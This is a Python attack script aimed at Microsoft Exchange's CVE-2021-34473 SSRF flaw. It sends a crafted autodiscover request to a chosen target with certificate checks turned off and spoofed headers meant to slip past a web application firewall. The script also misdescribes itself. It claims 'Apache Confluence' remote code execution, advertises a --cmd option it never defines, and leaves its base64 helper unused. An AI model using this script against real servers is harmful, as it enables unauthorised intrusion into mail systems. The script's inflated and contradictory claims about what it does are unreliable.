import requests
import argparse
import base64
import urllib.parse
import warnings

# SSL 경고 무시
warnings.simplefilter('ignore', category=UserWarning)

# Base64 인코딩
def encode_base64(cmd):
    return base64.b64encode(cmd.encode()).decode()

# HTTP 요청 헤더 변조 (WAF 우회)
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Referer": "https://google.com",
    "X-Forwarded-For": "127.0.0.1"
}

# CVE-2021-34473 Exploit (Exchange Server SSRF/RCE)
def exploit_cve_2021_34473(target_url):
    try:
        PAYLOAD = "/autodiscover/autodiscover.json?@mss.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@mss.com"
        EXPLOIT_URL = f"{target_url}{PAYLOAD}"

        response = requests.get(EXPLOIT_URL, headers=HEADERS, verify=False, timeout=10)

        print("[DEBUG] Response Headers:", response.headers)
        print("[DEBUG] Response Body:", response.text)

        if response.status_code == 200:
            print("[SUCCESS] CVE-2021-34473 Exploit sent successfully!")
            print("Server Response:")
            print(response.text)
        else:
            print("[FAIL] CVE-2021-34473 Exploit failed. Check target and parameters.")
    except requests.exceptions.RequestException as err:
        print(f"[ERROR] {err}")
        print("[FAIL] Exploit attempt failed.")

# 메인 함수
def main():
    parser = argparse.ArgumentParser(
        description="Apache Confluence & Exchange Server Remote Code Execution (RCE) Exploit Tool",
        usage="python3 exploit.py --url <URL> [--cmd <COMMAND>]"
    )
    parser.add_argument("--url", required=True, help="Target URL")
    
    args = parser.parse_args()

    print("[INFO] Attempting exploitation...")
    exploit_cve_2021_34473(args.url)

if __name__ == "__main__":
    main()
